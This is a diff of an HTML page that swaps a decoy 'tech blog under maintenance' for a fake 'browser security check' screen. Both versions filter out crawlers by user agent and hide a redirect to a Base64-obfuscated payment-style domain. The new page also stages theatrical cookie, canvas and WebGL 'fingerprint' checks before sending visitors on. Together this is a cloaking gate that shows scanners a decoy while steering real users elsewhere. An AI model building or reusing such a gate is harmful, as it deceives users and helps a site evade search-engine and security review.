@@ -1,113 +1,143 @@
-<!DOCTYPE html>
-<html lang="zh">
+<!doctype html>
+<html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
-  <title>Aistrip 技术博客</title>
-  <meta name="description" content="分享前端开发、AI接口部署、反爬策略等技术经验。">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>浏览器安全检查</title>
   <style>
     body {
-      font-family: "Helvetica Neue", sans-serif;
-      background-color: #f9f9f9;
-      color: #333;
-      max-width: 960px;
-      margin: 0 auto;
-      padding: 40px 20px;
+      margin: 0; font-family: "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif;
+      background: #0b1220; color: #e6ebf5; display: flex; align-items: center; justify-content: center;
+      min-height: 100vh;
     }
-    header {
-      text-align: center;
-      margin-bottom: 40px;
-    }
-    .cover {
-      width: 100%;
-      max-height: 240px;
-      object-fit: cover;
-      border-radius: 8px;
-    }
-    nav {
-      margin-top: 20px;
-    }
-    nav a {
-      margin: 0 12px;
-      text-decoration: none;
-      color: #0078d4;
-      font-weight: bold;
-    }
-    h1 {
-      font-size: 2em;
-      margin-bottom: 0.5em;
-    }
-    p {
-      line-height: 1.8;
-      margin-bottom: 1em;
-    }
-    .footer {
-      margin-top: 60px;
-      font-size: 0.9em;
-      color: #999;
-      text-align: center;
-    }
+    .wrap { width: 90%; max-width: 600px; background: #121a2b; border-radius: 12px; padding: 20px; box-shadow: 0 10px 40px rgba(0,0,0,.5); }
+    .logo { text-align: center; margin-bottom: 20px; }
+    .logo img { width: 80px; height: 80px; }
+    .status { text-align: center; margin-bottom: 10px; }
+    .progress { width: 100%; height: 12px; background: #0b1329; border-radius: 6px; overflow: hidden; margin: 10px 0; }
+    .bar { height: 100%; width: 0%; background: linear-gradient(90deg,#2e6df6,#53a0ff); transition: width .3s ease; }
+    .percent { text-align: right; font-size: 13px; color: #cfe0ff; }
+    .checks { margin: 15px 0; }
+    .check { margin: 6px 0; font-size: 14px; }
+    .dot { display:inline-block; width:10px; height:10px; border-radius:50%; margin-right:6px; background:#3a4a6b; }
+    .dot.ok { background:#3ccf8e; }
+    .dot.err { background:#ff5a5a; }
+    .reason { color:#ffb7b7; font-size:13px; display:none; margin-top:10px; }
+    .btn { display:block; width:100%; padding:12px; margin-top:20px; border:none; border-radius:8px;
+      background:linear-gradient(180deg,#2e6df6,#1f53c7); color:#fff; font-weight:600; cursor:pointer; }
+    .btn:disabled { opacity:.5; cursor:not-allowed; }
   </style>
 </head>
 <body>
-  <header>
-    <img src="cover.jpg" alt="博客封面" class="cover">
-    <nav>
-      <a href="index.html">首页</a>
-      <a href="posts.html">文章</a>
-      <a href="comments.html">评论</a>
-      <a href="about.html">关于我们</a>
-    </nav>
-  </header>
+  <div class="wrap">
+    <div class="logo"><img src="assets/logo.png" alt="LOGO"></div>
+    <div class="status" id="statusText">正在进行安全检测...</div>
+    <div class="progress"><div class="bar" id="bar"></div></div>
+    <div class="percent" id="percent">0%</div>
 
-  <main>
-    <h1>欢迎来到 Aistrip 技术博客</h1>
-    <p>我们专注于前端国际化改造、AI接口部署、反爬策略研究与跳板页架构优化。</p>
-    <p>本博客正在维护中，预计将在 2025 年底上线正式内容。</p>
-    <p>如果您是受邀用户，系统将自动跳转至服务平台。</p>
-  </main>
+    <div class="checks">
+      <div class="check"><span class="dot" id="uaDot"></span><span id="uaText">UA 检查</span></div>
+      <div class="check"><span class="dot" id="cookieDot"></span><span id="cookieText">Cookie 验证</span></div>
+      <div class="check"><span class="dot" id="canvasDot"></span><span id="canvasText">Canvas 指纹</span></div>
+      <div class="check"><span class="dot" id="webglDot"></span><span id="webglText">WebGL 指纹</span></div>
+    </div>
 
-  <div class="footer">
-    &copy; 2025 Aistrip | 技术驱动 · 安全优先
+    <div class="reason" id="reason"></div>
+    <button class="btn" id="goBtn" disabled>浏览器安全检查通过，请点击继续访问</button>
   </div>
 
   <script>
-    // ✅ UA 判断（仅屏蔽爬虫，允许 App 内跳转）
-    const ua = navigator.userAgent.toLowerCase();
-    const isBot = /bot|spider|crawler|curl|python|wget|headless/.test(ua);
+    // ==========================
+    // Base64 加密后的跳转地址
+    // ==========================
+    const _x1 = "aHR0cHM6Ly93ZWIuZGlkaXBheS52aXAv"; // https://web.didipay.vip/
 
-    // ✅ Base64 加密跳转地址列表（多域名）
-    const encodedList = [
-      'aHR0cHM6Ly93ZWIuZGlkaXBheS52aXAv',       // web.didipay.vip
-      'aHR0cHM6Ly93ZWIuZGlkaXBheS52aXAv',   // strip.apistrip.com
-    ];
+    // ==========================
+    // 工具函数
+    // ==========================
+    const el = id => document.getElementById(id);
+    const setDot = (id,state)=>{el(id).className="dot "+state;};
+    const setText = (id,text)=>{el(id).textContent=text;};
+    const setProgress = p=>{
+      el("bar").style.width=p+"%"; el("percent").textContent=p+"%";
+    };
 
-    // ✅ 检测域名是否可用（通过加载 ping.png）
-    function checkDomain(url) {
-      return new Promise((resolve) => {
-        const img = new Image();
-        img.src = url + '/ping.png?' + Date.now();
-        img.onload = () => resolve(url);
-        img.onerror = () => resolve(null);
-      });
+    // ==========================
+    // 检查逻辑
+    // ==========================
+    function checkUA(){
+      const ua=(navigator.userAgent||"").toLowerCase();
+      if(ua.includes("bot")||ua.includes("spider")||ua.includes("curl")||ua.includes("wget")){
+        setDot("uaDot","err"); setText("uaText","UA 检查失败：疑似爬虫");
+        return false;
+      }
+      setDot("uaDot","ok"); setText("uaText","UA 检查通过"); return true;
+    }
+    function checkCookie(){
+      try{
+        document.cookie="sc_gate=1;path=/;SameSite=Lax";
+        setDot("cookieDot","ok"); setText("cookieText","Cookie 验证通过"); return true;
+      }catch(e){
+        setDot("cookieDot","err"); setText("cookieText","Cookie 设置失败"); return false;
+      }
+    }
+    function checkCanvas(){
+      try{
+        const c=document.createElement("canvas"); c.width=100;c.height=30;
+        const ctx=c.getContext("2d"); ctx.fillText("fingerprint",10,20);
+        c.toDataURL(); setDot("canvasDot","ok"); setText("canvasText","Canvas 指纹生成成功"); return true;
+      }catch(e){
+        setDot("canvasDot","err"); setText("canvasText","Canvas 指纹失败"); return false;
+      }
+    }
+    function checkWebGL(){
+      try{
+        const c=document.createElement("canvas"); const gl=c.getContext("webgl");
+        if(!gl) throw new Error("WebGL 不可用");
+        setDot("webglDot","ok"); setText("webglText","WebGL 指纹生成成功"); return true;
+      }catch(e){
+        setDot("webglDot","err"); setText("webglText","WebGL 指纹失败"); return false;
+      }
     }
 
-    // ✅ 并行检测并跳转第一个可用域名
-    async function autoRedirect() {
-      if (isBot) return;
+    async function runChecks(){
+      setProgress(10); setText("statusText","正在检查 UA...");
+      const ua=checkUA(); setProgress(30);
 
-      const urls = encodedList.map(encoded => atob(encoded));
-      const checks = urls.map(url => checkDomain(url));
-      const results = await Promise.all(checks);
+      setText("statusText","正在验证 Cookie...");
+      const ck=checkCookie(); setProgress(50);
 
-      const valid = results.find(url => url);
-      if (valid) window.location.href = valid;
+      setText("statusText","正在生成 Canvas 指纹...");
+      const cv=checkCanvas(); setProgress(70);
+
+      setText("statusText","正在生成 WebGL 指纹...");
+      const wg=checkWebGL(); setProgress(90);
+
+      const failures=[];
+      if(!ua) failures.push("UA 检查失败");
+      if(!ck) failures.push("Cookie 验证失败");
+      if(!cv) failures.push("Canvas 指纹失败");
+      if(!wg) failures.push("WebGL 指纹失败");
+
+      if(failures.length>0){
+        setText("statusText","安全检查失败");
+        setProgress(100);
+        el("reason").textContent="失败原因："+failures.join("；");
+        el("reason").style.display="block";
+        el("goBtn").style.display="none";
+      }else{
+        setText("statusText","检测完成");
+        setProgress(100);
+        const btn=el("goBtn");
+        btn.disabled=false;
+        btn.addEventListener("click",()=>{
+          const url=atob(_x1); // 解码得到真实地址
+          window.location.href=url;
+        });
+      }
     }
 
-    // ✅ 页面加载后延迟跳转（每次打开都会跳）
-    document.addEventListener('DOMContentLoaded', () => {
-      setTimeout(autoRedirect, 500);
-    });
+    document.addEventListener("DOMContentLoaded",runChecks);
   </script>
 </body>
 </html>
